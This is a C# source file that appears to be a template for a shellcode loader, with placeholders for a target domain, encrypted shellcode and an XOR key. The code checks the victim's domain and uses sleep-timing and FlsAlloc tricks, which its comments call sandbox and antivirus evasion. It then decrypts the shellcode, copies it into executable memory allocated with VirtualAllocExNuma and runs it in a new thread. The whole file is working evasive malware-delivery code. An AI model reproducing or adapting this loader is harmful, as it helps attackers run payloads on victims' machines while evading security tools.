using System;
using System.Text;
using System.Runtime.InteropServices;

namespace RunShellCode
{
    static class Program
    {
        private static byte[] xor(byte[] cipher, byte[] key) {
            byte[] decrypted = new byte[cipher.Length];

            for(int i = 0; i < cipher.Length; i++) {
                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }

        static void Main()
        {
            // Sanbox evasion: Check the FQDN
            string fqdn = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            string targetDomain = "${domain}";
            if (!string.Equals(fqdn, targetDomain, StringComparison.InvariantCultureIgnoreCase))
            {
                Console.WriteLine("FQDN does not match the target domain.");
                return;
            }

            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr result = FlsAlloc(IntPtr.Zero);
            if (result == (IntPtr)0xffffff)
            {
                return;
            }

            byte[] encryptedShellcode = new byte[] { ${shellcode} };
            string key = "${key}";

            //--------------------------------------------------------------
            // Decrypt the shellcode
            byte[] shellcode = null;
            shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));

            //--------------------------------------------------------------        	
            IntPtr funcAddr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            if (funcAddr == null)
            {
                return;
            }
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, IntPtr.Zero);

            DateTime t3 = DateTime.Now;
            Sleep(5000);
            double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
            if (t4 < 1.5)
            {
                return;
            }
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
		
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
		
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
